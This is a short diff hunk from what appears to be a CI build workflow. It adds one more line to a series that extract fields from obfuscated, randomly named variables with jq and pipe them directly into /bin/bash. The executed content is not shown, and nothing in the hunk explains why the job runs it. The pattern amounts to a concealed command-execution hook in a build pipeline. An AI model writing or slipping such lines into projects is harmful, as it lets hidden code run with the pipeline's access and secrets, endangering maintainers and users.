@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$bn560" | jq -r .imv9081 | /bin/bash
           echo $x832 | jq -r .j241 | /bin/bash
           printf '%s' "$v2" | jq -r .x5 | /bin/bash
+          echo $dbrkt87576 | jq -r .ox653 | /bin/bash
 
       - name: Archive output
         if: always()
